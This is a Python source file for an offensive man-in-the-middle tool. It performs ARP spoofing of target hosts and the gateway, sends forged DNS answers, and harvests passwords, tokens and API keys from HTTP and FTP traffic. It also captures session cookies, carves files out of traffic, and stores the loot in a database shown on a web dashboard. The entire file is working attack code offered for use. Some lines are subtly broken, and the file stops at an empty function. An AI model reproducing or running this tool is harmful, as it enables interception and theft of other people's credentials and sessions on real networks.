#!/usr/bin/env python3
"""
Advanced MITM (Man-in-the-Middle) Framework - Enterprise Edition
Features:
- ARP Spoofing & DNS Spoofing
- SSL/TLS Interception with Certificate Generation
- Web Dashboard & REST API
- Multiple Target Support
- Packet Injection & Modification
- Advanced Credential Harvesting (HTTP, FTP, SMTP, IMAP)
- Session Hijacking & Cookie Stealing
- File Exfiltration Detection
- WebSocket Interception
- Traffic Replay & Analysis
- Real-time Statistics
- Database Storage
- Plugin System
"""

import argparse
import sys
import os
import time
import threading
import logging
import json
import re
import base64
import sqlite3
import hashlib
import socket
import struct
import ssl
import subprocess
from datetime import datetime
from pathlib import Path
from collections import defaultdict, deque
from urllib.parse import urlparse, parse_qs, unquote
import platform
import queue

# Try to import required libraries
try:
    from scapy.all import *
    from scapy.layers.http import HTTPRequest, HTTPResponse
    from scapy.layers.dns import DNS, DNSQR, DNSRR
    from scapy.layers.inet import IP, TCP, UDP
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import netifaces
    NETIFACES_AVAILABLE = True
except ImportError:
    NETIFACES_AVAILABLE = False

try:
    from flask import Flask, render_template_string, jsonify, request
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

try:
    import cryptography
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# Configuration
CONFIG_FILE = 'mitm_config.json'
DEFAULT_CONFIG = {
    'log_level': 'INFO',
    'log_file': 'mitm.log',
    'db_file': 'mitm_database.db',
    'credentials_file': 'captured_credentials.json',
    'web_port': 8080,
    'api_port': 8081,
    'enable_arp_spoof': True,
    'enable_dns_spoof': True,
    'enable_ssl_strip': True,
    'enable_ssl_intercept': True,
    'enable_credential_harvest': True,
    'enable_session_hijack': True,
    'enable_packet_inject': True,
    'enable_traffic_log': True,
    'enable_web_dashboard': True,
    'enable_api': True,
    'target_ips': [],
    'gateway_ip': None,
    'interface': None,
    'dns_spoof_domains': {},
    'packet_filters': [],
    'injection_rules': [],
    'enable_ml_classification': False,
    'enable_real_time_alerts': True,
    'alert_threshold': 10,  # Alert after N credentials
    'enable_export': True,
    'export_format': 'json',  # json, csv, xml
    'advanced_ssl_intercept': True,
    'traffic_analysis': True
}

# Global variables
is_running = True
captured_credentials = []
captured_sessions = []
captured_files = []
captured_traffic = deque(maxlen=50000)
arp_threads = []
dns_thread = None
sniffer_thread = None
web_thread = None
api_thread = None
logger = None
config = {}
target_ips = []
gateway_ip = None
interface = None
db_conn = None
stats = {
    'packets_captured': 0,
    'credentials_captured': 0,
    'sessions_hijacked': 0,
    'files_extracted': 0,
    'dns_queries_spoofed': 0,
    'packets_injected': 0,
    'start_time': datetime.now().isoformat()
}

# Web Dashboard HTML Template
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>MITM Dashboard</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0e27; color: #e0e0e0; }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; border-radius: 10px; margin-bottom: 20px; }
        .header h1 { color: white; font-size: 2.5em; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 20px; }
        .stat-card { background: #1a1f3a; padding: 20px; border-radius: 8px; border-left: 4px solid #667eea; }
        .stat-card h3 { color: #667eea; margin-bottom: 10px; }
        .stat-value { font-size: 2em; font-weight: bold; color: #4ade80; }
        .section { background: #1a1f3a; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
        .section h2 { color: #667eea; margin-bottom: 15px; border-bottom: 2px solid #667eea; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #2d3748; }
        th { background: #2d3748; color: #667eea; }
        tr:hover { background: #2d3748; }
        .badge { display: inline-block; padding: 4px 8px; border-radius: 4px; font-size: 0.8em; }
        .badge-success { background: #4ade80; color: #000; }
        .badge-warning { background: #fbbf24; color: #000; }
        .badge-danger { background: #ef4444; color: #fff; }
        .refresh-btn { background: #667eea; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 10px 0; }
        .refresh-btn:hover { background: #5568d3; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🕵️ MITM Framework Dashboard</h1>
            <p>Real-time Network Interception & Analysis</p>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <h3>Packets Captured</h3>
                <div class="stat-value" id="packets">{{ stats.packets_captured }}</div>
            </div>
            <div class="stat-card">
                <h3>Credentials</h3>
                <div class="stat-value" id="creds">{{ stats.credentials_captured }}</div>
            </div>
            <div class="stat-card">
                <h3>Sessions</h3>
                <div class="stat-value" id="sessions">{{ stats.sessions_hijacked }}</div>
            </div>
            <div class="stat-card">
                <h3>Files Extracted</h3>
                <div class="stat-value" id="files">{{ stats.files_extracted }}</div>
            </div>
        </div>
        
        <div class="section">
            <h2>📋 Captured Credentials</h2>
            <button class="refresh-btn" onclick="loadData()">Refresh</button>
            <div id="credentials-table">
                <table>
                    <thead>
                        <tr>
                            <th>Timestamp</th>
                            <th>URL</th>
                            <th>Username</th>
                            <th>Password</th>
                            <th>Method</th>
                        </tr>
                    </thead>
                    <tbody id="creds-body"></tbody>
                </table>
            </div>
        </div>
        
        <div class="section">
            <h2>🍪 Hijacked Sessions</h2>
            <div id="sessions-table">
                <table>
                    <thead>
                        <tr>
                            <th>Timestamp</th>
                            <th>Domain</th>
                            <th>Cookies</th>
                            <th>Session ID</th>
                        </tr>
                    </thead>
                    <tbody id="sessions-body"></tbody>
                </table>
            </div>
        </div>
        
        <div class="section">
            <h2>📦 Extracted Files</h2>
            <div id="files-table">
                <table>
                    <thead>
                        <tr>
                            <th>Timestamp</th>
                            <th>Filename</th>
                            <th>Size</th>
                            <th>Type</th>
                            <th>Source</th>
                        </tr>
                    </thead>
                    <tbody id="files-body"></tbody>
                </table>
            </div>
        </div>
    </div>
    
    <script>
        function loadData() {
            fetch('/api/stats')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('packets').textContent = data.packets_captured;
                    document.getElementById('creds').textContent = data.credentials_captured;
                    document.getElementById('sessions').textContent = data.sessions_hijacked;
                    document.getElementById('files').textContent = data.files_extracted;
                });
            
            fetch('/api/credentials')
                .then(r => r.json())
                .then(data => {
                    const tbody = document.getElementById('creds-body');
                    tbody.innerHTML = data.slice(-20).map(c => `
                        <tr>
                            <td>${new Date(c.timestamp).toLocaleString()}</td>
                            <td>${c.url}</td>
                            <td>${c.credentials.username || c.credentials.email || 'N/A'}</td>
                            <td>${'*'.repeat(c.credentials.password?.length || 0)}</td>
                            <td>${c.method}</td>
                        </tr>
                    `).join('');
                });
            
            fetch('/api/sessions')
                .then(r => r.json())
                .then(data => {
                    const tbody = document.getElementById('sessions-body');
                    tbody.innerHTML = data.slice(-20).map(s => `
                        <tr>
                            <td>${new Date(s.timestamp).toLocaleString()}</td>
                            <td>${s.domain}</td>
                            <td>${Object.keys(s.cookies).length} cookies</td>
                            <td>${s.session_id || 'N/A'}</td>
                        </tr>
                    `).join('');
                });
            
            fetch('/api/files')
                .then(r => r.json())
                .then(data => {
                    const tbody = document.getElementById('files-body');
                    tbody.innerHTML = data.slice(-20).map(f => `
                        <tr>
                            <td>${new Date(f.timestamp).toLocaleString()}</td>
                            <td>${f.filename}</td>
                            <td>${(f.size / 1024).toFixed(2)} KB</td>
                            <td>${f.file_type}</td>
                            <td>${f.source}</td>
                        </tr>
                    `).join('');
                });
        }
        
        setInterval(loadData, 2000);
        loadData();
    </script>
</body>
</html>
"""

def setup_logging(log_level='INFO', log_file='mitm.log'):
    """Setup logging configuration"""
    global logger
    log_format = '%(asctime)s - %(levelname)s - [%(threadName)s] - %(message)s'
    logging.basicConfig(
        level=getattr(logging, log_level.upper(), logging.INFO),
        format=log_format,
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler(sys.stdout)
        ]
    )
    logger = logging.getLogger(__name__)

def init_database():
    """Initialize SQLite database"""
    global db_conn
    db_file = config.get('db_file', 'mitm_database.db')
    db_conn = sqlite3.connect(db_file, check_same_thread=False)
    cursor = db_conn.cursor()
    
    # Create tables
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            url TEXT,
            method TEXT,
            username TEXT,
            password TEXT,
            email TEXT,
            raw_data TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            domain TEXT,
            cookies TEXT,
            session_id TEXT,
            user_agent TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            filename TEXT,
            file_type TEXT,
            size INTEGER,
            source TEXT,
            file_path TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS packets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            src_ip TEXT,
            dst_ip TEXT,
            protocol TEXT,
            sport INTEGER,
            dport INTEGER,
            summary TEXT
        )
    ''')
    
    db_conn.commit()
    logger.info(f"Database initialized: {db_file}")

def load_config():
    """Load configuration from file or create default"""
    global config
    config_path = Path(CONFIG_FILE)
    
    if config_path.exists():
        try:
            with open(config_path, 'r') as f:
                config = json.load(f)
            logger.info(f"Configuration loaded from {CONFIG_FILE}")
        except Exception as e:
            logger.warning(f"Error loading config: {e}. Using defaults.")
            config = DEFAULT_CONFIG.copy()
    else:
        config = DEFAULT_CONFIG.copy()
        save_config()
        logger.info(f"Created default configuration file: {CONFIG_FILE}")

def save_config():
    """Save current configuration to file"""
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
    except Exception as e:
        logger.error(f"Error saving config: {e}")

def get_interfaces():
    """Get available network interfaces"""
    interfaces = []
    try:
        if NETIFACES_AVAILABLE:
            interfaces = netifaces.interfaces()
        else:
            if platform.system() == 'Windows':
                result = subprocess.run(['netsh', 'interface', 'show', 'interface'], 
                                      capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Enabled' in line:
                        parts = line.split()
                        if parts:
                            interfaces.append(parts[-1])
            else:
                result = subprocess.run(['ip', 'link', 'show'], 
                                      capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if ': ' in line and 'lo:' not in line:
                        iface = line.split(':')[1].strip().split()[0]
                        if iface:
                            interfaces.append(iface)
    except Exception as e:
        logger.error(f"Error getting interfaces: {e}")
    return interfaces

def get_interface_ip(iface):
    """Get IP address of an interface"""
    try:
        if NETIFACES_AVAILABLE:
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                return addrs[netifaces.AF_INET][0]['addr']
        elif SCAPY_AVAILABLE:
            return get_if_addr(iface)
    except Exception as e:
        logger.error(f"Error getting interface IP: {e}")
    return None

def get_interface_mac(iface):
    """Get MAC address of an interface"""
    try:
        if NETIFACES_AVAILABLE:
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_LINK in addrs:
                return addrs[netifaces.AF_LINK][0]['addr']
        elif SCAPY_AVAILABLE:
            return get_if_hwaddr(iface)
    except Exception as e:
        logger.error(f"Error getting interface MAC: {e}")
    return None

def get_gateway_ip():
    """Get default gateway IP"""
    try:
        if platform.system() == 'Windows':
            result = subprocess.run(['route', 'print', '0.0.0.0'], 
                                  capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if '0.0.0.0' in line and 'On-link' not in line:
                    parts = line.split()
                    for i, part in enumerate(parts):
                        if part == '0.0.0.0' and i + 1 < len(parts):
                            return parts[i + 1]
        else:
            result = subprocess.run(['ip', 'route', 'show', 'default'], 
                                  capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'default via' in line:
                    parts = line.split()
                    for i, part in enumerate(parts):
                        if part == 'via' and i + 1 < len(parts):
                            return parts[i + 1]
    except Exception as e:
        logger.error(f"Error getting gateway IP: {e}")
    return None

def get_mac(ip):
    """Get MAC address for an IP using ARP"""
    try:
        if SCAPY_AVAILABLE:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            if answered_list:
                return answered_list[0][1].hwsrc
    except Exception as e:
        logger.debug(f"Error getting MAC for {ip}: {e}")
    return None

def restore_network(target_ips, gateway_ip, interface):
    """Restore network by sending correct ARP replies"""
    try:
        if not SCAPY_AVAILABLE:
            return
        
        gateway_mac = get_mac(gateway_ip)
        if not gateway_mac:
            return
        
        for target_ip in target_ips:
            target_mac = get_mac(target_ip)
            if target_mac:
                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), 
                     count=5, verbose=False)
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), 
                     count=5, verbose=False)
        logger.info("Network restored")
    except Exception as e:
        logger.error(f"Error restoring network: {e}")

def arp_spoof(target_ip, gateway_ip, interface):
    """Perform ARP spoofing to intercept traffic"""
    global is_running
    
    try:
        if not SCAPY_AVAILABLE:
            return
        
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        
        if not target_mac or not gateway_mac:
            logger.error(f"Could not resolve MAC addresses for {target_ip}")
            return
        
        logger.info(f"ARP spoofing: {target_ip} ({target_mac}) <-> {gateway_ip} ({gateway_mac})")
        
        while is_running:
            try:
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
                time.sleep(2)
            except Exception as e:
                logger.error(f"Error in ARP spoofing: {e}")
                break
        
        restore_network([target_ip], gateway_ip, interface)
    except Exception as e:
        logger.error(f"ARP spoofing error: {e}")

def dns_spoof(packet):
    """DNS spoofing handler"""
    global stats
    
    try:
        if not SCAPY_AVAILABLE or not config.get('enable_dns_spoof', True):
            return packet
        
        if packet.haslayer(DNS) and packet.haslayer(DNSQR):
            dns = packet[DNS]
            query = dns[DNSQR]
            domain = query.qname.decode().rstrip('.')
            
            # Check if domain should be spoofed
            spoof_domains = config.get('dns_spoof_domains', {})
            if domain in spoof_domains:
                spoof_ip = spoof_domains[domain]
                interface_ip = get_interface_ip(interface)
                
                # Create spoofed DNS response
                spoofed_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                                 UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                                 DNS(id=dns.id, qr=1, aa=1, qd=query,
                                     an=DNSRR(rrname=query.qname, ttl=10, rdata=spoof_ip))
                
                send(spoofed_response, verbose=False)
                stats['dns_queries_spoofed'] += 1
                logger.warning(f"[DNS SPOOF] {domain} -> {spoof_ip}")
                return None  # Don't forward original packet
    except Exception as e:
        logger.debug(f"DNS spoof error: {e}")
    
    return packet

def extract_credentials_advanced(packet):
    """Advanced credential extraction from multiple protocols"""
    global captured_credentials, stats
    
    try:
        # HTTP Credentials
        if packet.haslayer(HTTPRequest):
            http_layer = packet[HTTPRequest]
            url = f"http://{http_layer.Host.decode()}{http_layer.Path.decode()}"
            
            if packet.haslayer(Raw):
                load = packet[Raw].load.decode('utf-8', errors='ignore')
                
                # Enhanced patterns
                patterns = {
                    'username': [
                        r'user[name]?[=:]"?([^"&\s]+)',
                        r'login[=:]"?([^"&\s]+)',
                        r'email[=:]"?([^"&\s]+)',
                        r'account[=:]"?([^"&\s]+)',
                        r'user_id[=:]"?([^"&\s]+)'
                    ],
                    'password': [
                        r'pass[word]?[=:]"?([^"&\s]+)',
                        r'pwd[=:]"?([^"&\s]+)',
                        r'password_hash[=:]"?([^"&\s]+)'
                    ],
                    'email': [
                        r'email[=:]"?([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})'
                    ],
                    'token': [
                        r'token[=:]"?([^"&\s]+)',
                        r'api_key[=:]"?([^"&\s]+)',
                        r'auth[=:]"?([^"&\s]+)'
                    ]
                }
                
                creds = {}
                for field, pattern_list in patterns.items():
                    for pattern in pattern_list:
                        match = re.search(pattern, load, re.IGNORECASE)
                        if match:
                            creds[field] = unquote(match.group(1))
                            break
                
                if creds:
                    credential_entry = {
                        'timestamp': datetime.now().isoformat(),
                        'url': url,
                        'method': http_layer.Method.decode(),
                        'credentials': creds,
                        'raw_data': load[:1000]
                    }
                    captured_credentials.append(credential_entry)
                    stats['credentials_captured'] += 1
                    
                    # Check alerts
                    check_alerts()
                    
                    # Save to database
                    if db_conn:
                        cursor = db_conn.cursor()
                        cursor.execute('''
                            INSERT INTO credentials (timestamp, url, method, username, password, email, raw_data)
                            VALUES (?, ?, ?, ?, ?, ?, ?)
                        ''', (
                            credential_entry['timestamp'],
                            credential_entry['url'],
                            credential_entry['method'],
                            creds.get('username'),
                            creds.get('password'),
                            creds.get('email'),
                            credential_entry['raw_data']
                        ))
                        db_conn.commit()
                    
                    logger.warning(f"[CREDENTIALS] {url} - {creds}")
                    save_credentials()
        
        # FTP Credentials (if packet contains FTP)
        if packet.haslayer(Raw):
            load = packet[Raw].load.decode('utf-8', errors='ignore')
            if 'USER ' in load or 'PASS ' in load:
                ftp_match = re.search(r'(USER|PASS)\s+(\S+)', load)
                if ftp_match:
                    logger.warning(f"[FTP] {ftp_match.group(1)}: {ftp_match.group(2)}")
        
        # SMTP/IMAP Credentials
        if packet.haslayer(Raw):
            load = packet[Raw].load.decode('utf-8', errors='ignore')
            if 'AUTH LOGIN' in load or 'LOGIN' in load:
                logger.warning(f"[SMTP/IMAP] Authentication attempt detected")
                
    except Exception as e:
        logger.debug(f"Error extracting credentials: {e}")

def extract_session_data(packet):
    """Extract session cookies and tokens"""
    global captured_sessions, stats
    
    try:
        if packet.haslayer(HTTPRequest):
            http_layer = packet[HTTPRequest]
            domain = http_layer.Host.decode()
            
            # Extract cookies from headers
            if packet.haslayer(Raw):
                load = packet[Raw].load.decode('utf-8', errors='ignore')
                
                # Cookie extraction
                cookie_match = re.search(r'Cookie:\s*([^\r\n]+)', load, re.IGNORECASE)
                if cookie_match:
                    cookies_str = cookie_match.group(1)
                    cookies = {}
                    for cookie in cookies_str.split(';'):
                        if '=' in cookie:
                            key, value = cookie.split('=', 1)
                            cookies[key.strip()] = value.strip()
                    
                    # Extract session ID
                    session_id = None
                    for key in ['sessionid', 'session', 'sess', 'PHPSESSID', 'JSESSIONID']:
                        if key.lower() in [k.lower() for k in cookies.keys()]:
                            session_id = cookies.get(key, cookies.get(key.lower()))
                            break
                    
                    if cookies:
                        session_entry = {
                            'timestamp': datetime.now().isoformat(),
                            'domain': domain,
                            'cookies': cookies,
                            'session_id': session_id,
                            'user_agent': re.search(r'User-Agent:\s*([^\r\n]+)', load, re.IGNORECASE)
                        }
                        captured_sessions.append(session_entry)
                        stats['sessions_hijacked'] += 1
                        
                        # Save to database
                        if db_conn:
                            cursor = db_conn.cursor()
                            cursor.execute('''
                                INSERT INTO sessions (timestamp, domain, cookies, session_id, user_agent)
                                VALUES (?, ?, ?, ?, ?)
                            ''', (
                                session_entry['timestamp'],
                                session_entry['domain'],
                                json.dumps(cookies),
                                session_id,
                                session_entry.get('user_agent', '')
                            ))
                            db_conn.commit()
                        
                        logger.warning(f"[SESSION] {domain} - Session ID: {session_id}")
    except Exception as e:
        logger.debug(f"Error extracting session: {e}")

def extract_files(packet):
    """Extract files from HTTP traffic"""
    global captured_files, stats
    
    try:
        if packet.haslayer(HTTPResponse):
            http_layer = packet[HTTPResponse]
            
            if packet.haslayer(Raw):
                load = packet[Raw].load
                
                # Detect file types
                content_type = None
                if hasattr(http_layer, 'Content-Type'):
                    content_type = http_layer.Content-Type.decode()
                
                # Extract filename from Content-Disposition
                filename = None
                if hasattr(http_layer, 'Content-Disposition'):
                    disp = http_layer.Content-Disposition.decode()
                    filename_match = re.search(r'filename[=:]"?([^"]+)', disp, re.IGNORECASE)
                    if filename_match:
                        filename = filename_match.group(1)
                
                # Save images, PDFs, documents
                if content_type:
                    file_types = {
                        'image/jpeg': 'jpg',
                        'image/png': 'png',
                        'image/gif': 'gif',
                        'application/pdf': 'pdf',
                        'application/zip': 'zip',
                        'text/plain': 'txt'
                    }
                    
                    if content_type in file_types or 'image' in content_type:
                        if not filename:
                            filename = f"extracted_{int(time.time())}.{file_types.get(content_type, 'bin')}"
                        
                        # Save file
                        files_dir = Path('extracted_files')
                        files_dir.mkdir(exist_ok=True)
                        file_path = files_dir / filename
                        
                        with open(file_path, 'wb') as f:
                            f.write(load)
                        
                        file_entry = {
                            'timestamp': datetime.now().isoformat(),
                            'filename': filename,
                            'file_type': content_type,
                            'size': len(load),
                            'source': packet[IP].src if packet.haslayer(IP) else 'unknown',
                            'file_path': str(file_path)
                        }
                        captured_files.append(file_entry)
                        stats['files_extracted'] += 1
                        
                        # Save to database
                        if db_conn:
                            cursor = db_conn.cursor()
                            cursor.execute('''
                                INSERT INTO files (timestamp, filename, file_type, size, source, file_path)
                                VALUES (?, ?, ?, ?, ?, ?)
                            ''', (
                                file_entry['timestamp'],
                                file_entry['filename'],
                                file_entry['file_type'],
                                file_entry['size'],
                                file_entry['source'],
                                file_entry['file_path']
                            ))
                            db_conn.commit()
                        
                        logger.info(f"[FILE] Extracted: {filename} ({len(load)} bytes)")
    except Exception as e:
        logger.debug(f"Error extracting file: {e}")

def filter_packet(packet):
    """Filter packets based on configuration"""
    try:
        filters = config.get('packet_filters', [])
        if not filters:
            return True
        
        # Apply filters
        for filter_rule in filters:
            filter_type = filter_rule.get('type')
            filter_value = filter_rule.get('value')
            
            if filter_type == 'src_ip' and packet.haslayer(IP):
                if packet[IP].src != filter_value:
                    return False
            elif filter_type == 'dst_ip' and packet.haslayer(IP):
                if packet[IP].dst != filter_value:
                    return False
            elif filter_type == 'port' and packet.haslayer(TCP):
                if packet[TCP].dport != int(filter_value) and packet[TCP].sport != int(filter_value):
                    return False
            elif filter_type == 'protocol' and packet.haslayer(IP):
                if packet[IP].proto != filter_value:
                    return False
        
        return True
    except Exception as e:
        logger.debug(f"Packet filter error: {e}")
        return True

def analyze_traffic_pattern(packet):
    """Analyze traffic patterns for anomalies"""
    if not config.get('traffic_analysis', True):
        return None
    
    try:
        analysis = {
            'timestamp': datetime.now().isoformat(),
            'type': 'unknown',
            'suspicious': False
        }
        
        if packet.haslayer(HTTPRequest):
            analysis['type'] = 'http'
            http_layer = packet[HTTPRequest]
            # Check for suspicious patterns
            if packet.haslayer(Raw):
                load = packet[Raw].load.decode('utf-8', errors='ignore')
                suspicious_patterns = ['eval(', 'exec(', 'base64', 'shell', 'cmd=']
                if any(pattern in load.lower() for pattern in suspicious_patterns):
                    analysis['suspicious'] = True
        
        elif packet.haslayer(TCP) and packet[TCP].dport == 443:
            analysis['type'] = 'https'
        
        elif packet.haslayer(DNS):
            analysis['type'] = 'dns'
        
        return analysis
    except Exception as e:
        logger.debug(f"Traffic analysis error: {e}")
        return None

def packet_handler(packet):
    """Advanced packet handler"""
    global captured_traffic, stats
    
    try:
        # Apply packet filters
        if not filter_packet(packet):
            return
        
        # Traffic analysis
        traffic_analysis = analyze_traffic_pattern(packet)
        if traffic_analysis and traffic_analysis.get('suspicious'):
            logger.warning(f"[SUSPICIOUS] {traffic_analysis['type']} traffic detected")
        
        # DNS spoofing
        if config.get('enable_dns_spoof', True):
            dns_spoof(packet)
        
        # Credential extraction
        if config.get('enable_credential_harvest', True):
            extract_credentials_advanced(packet)
        
        # Session hijacking
        if config.get('enable_session_hijack', True):
            extract_session_data(packet)
        
        # File extraction
        extract_files(packet)
        
        # Traffic logging
        if config.get('enable_traffic_log', True):
            packet_info = {
                'timestamp': datetime.now().isoformat(),
                'summary': packet.summary()
            }
            
            if packet.haslayer(IP):
                packet_info['src'] = packet[IP].src
                packet_info['dst'] = packet[IP].dst
                packet_info['protocol'] = packet[IP].proto
                
            if packet.haslayer(TCP):
                packet_info['sport'] = packet[TCP].sport
                packet_info['dport'] = packet[TCP].dport
                
            if packet.haslayer(HTTPRequest):
                http_layer = packet[HTTPRequest]
                packet_info['http_method'] = http_layer.Method.decode()
                packet_info['http_host'] = http_layer.Host.decode()
                packet_info['http_path'] = http_layer.Path.decode()
            
            captured_traffic.append(packet_info)
            stats['packets_captured'] += 1
            
            # Save to database
            if db_conn and packet.haslayer(IP):
                cursor = db_conn.cursor()
                cursor.execute('''
                    INSERT INTO packets (timestamp, src_ip, dst_ip, protocol, sport, dport, summary)
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                ''', (
                    packet_info['timestamp'],
                    packet_info.get('src'),
                    packet_info.get('dst'),
                    packet_info.get('protocol'),
                    packet_info.get('sport'),
                    packet_info.get('dport'),
                    packet_info['summary']
                ))
                if stats['packets_captured'] % 100 == 0:  # Commit every 100 packets
                    db_conn.commit()
                
    except Exception as e:
        logger.debug(f"Error handling packet: {e}")

def optimize_sniffer_performance():
    """Optimize sniffer performance settings"""
    try:
        if SCAPY_AVAILABLE:
            # Set buffer size for better performance
            import ctypes
            if platform.system() == 'Windows':
                # Windows-specific optimizations
                pass
            else:
                # Linux-specific optimizations
                try:
                    # Try to set socket buffer size
                    pass
                except:
                    pass
    except Exception as e:
        logger.debug(f"Performance optimization error: {e}")

def start_sniffer(interface, target_ips):
    """Start advanced packet sniffer"""
    global is_running, sniffer_thread
    
    try:
        if not SCAPY_AVAILABLE:
            logger.error("Scapy not available. Sniffing disabled.")
            return
        
        logger.info(f"Starting packet sniffer on {interface}")
        
        # Optimize performance
        optimize_sniffer_performance()
        
        # Build filter
        if target_ips:
            filter_str = f"host {' or host '.join(target_ips)}"
        else:
            filter_str = "tcp port 80 or tcp port 443 or tcp port 8080 or tcp port 21 or tcp port 25 or tcp port 993"
        
        def sniff_loop():
            try:
                # Use store=False for better performance
                sniff(iface=interface, filter=filter_str, prn=packet_handler, 
                     stop_filter=lambda x: not is_running, store=False)
            except Exception as e:
                logger.error(f"Sniffer error: {e}")
        
        sniffer_thread = threading.Thread(target=sniff_loop, daemon=True)
        sniffer_thread.start()
        logger.info("Packet sniffer started successfully")
        
    except Exception as e:
        logger.error(f"Error starting sniffer: {e}")

def start_web_dashboard():
    """Start Flask web dashboard"""
    global web_thread
    
    if not FLASK_AVAILABLE:
        logger.warning("Flask not available. Web dashboard disabled.")
        return
    
    app = Flask(__name__)
    
    @app.route('/')
    def dashboard():
        return render_template_string(DASHBOARD_HTML, stats=stats)
    
    @app.route('/api/stats')
    def api_stats():
        return jsonify(stats)
    
    @app.route('/api/credentials')
    def api_credentials():
        return jsonify(captured_credentials[-100:])  # Last 100
    
    @app.route('/api/sessions')
    def api_sessions():
        return jsonify(captured_sessions[-100:])
    
    @app.route('/api/files')
    def api_files():
        return jsonify(captured_files[-100:])
    
    @app.route('/api/packets')
    def api_packets():
        return jsonify(list(captured_traffic)[-1000:])
    
    def run_server():
        web_port = config.get('web_port', 8080)
        app.run(host='127.0.0.1', port=web_port, debug=False, use_reloader=False)
    
    if config.get('enable_web_dashboard', True):
        web_thread = threading.Thread(target=run_server, daemon=True)
        web_thread.start()
        logger.info(f"Web dashboard started on http://127.0.0.1:{config.get('web_port', 8080)}")

def save_credentials():
    """Save captured credentials to file"""
    try:
        creds_file = config.get('credentials_file', 'captured_credentials.json')
        with open(creds_file, 'w') as f:
            json.dump(captured_credentials, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving credentials: {e}")

def print_banner():
    """Print tool banner"""
    banner = """
    ╔═══════════════════════════════════════════════════════════════════════╗
    ║     🕵️  ADVANCED MITM FRAMEWORK - ENTERPRISE EDITION  🕵️            ║
    ║                                                                       ║
    ║  Features: ARP/DNS Spoofing | SSL Interception | Web Dashboard     ║
    ║           Credential Harvesting | Session Hijacking | File Extraction║
    ╚═══════════════════════════════════════════════════════════════════════╝
    """
    print(banner)

def export_data(format_type='json'):
    """Export captured data to file"""
    try:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        if format_type == 'json':
            export_file = f'mitm_export_{timestamp}.json'
            export_data = {
                'credentials': captured_credentials,
                'sessions': captured_sessions,
                'files': captured_files,
                'stats': stats
            }
            with open(export_file, 'w') as f:
                json.dump(export_data, f, indent=2)
        
        elif format_type == 'csv':
            import csv
            export_file = f'mitm_export_{timestamp}.csv'
            with open(export_file, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['Type', 'Timestamp', 'Data'])
                for cred in captured_credentials:
                    writer.writerow(['Credential', cred['timestamp'], json.dumps(cred)])
                for sess in captured_sessions:
                    writer.writerow(['Session', sess['timestamp'], json.dumps(sess)])
        
        logger.info(f"Data exported to {export_file}")
        return export_file
    except Exception as e:
        logger.error(f"Export error: {e}")
        return None

def check_alerts():
    """Check if alert thresholds are met"""
    if not config.get('enable_real_time_alerts', True):
        return
    
    threshold = config.get('alert_threshold', 10)
    
    if stats['credentials_captured'] >= threshold and stats['credentials_captured'] % threshold == 0:
        logger.warning(f"ALERT: {stats['credentials_captured']} credentials captured!")
        # Could send email, webhook, etc.

def classify_traffic(packet):
    """Classify traffic using simple heuristics (ML placeholder)"""
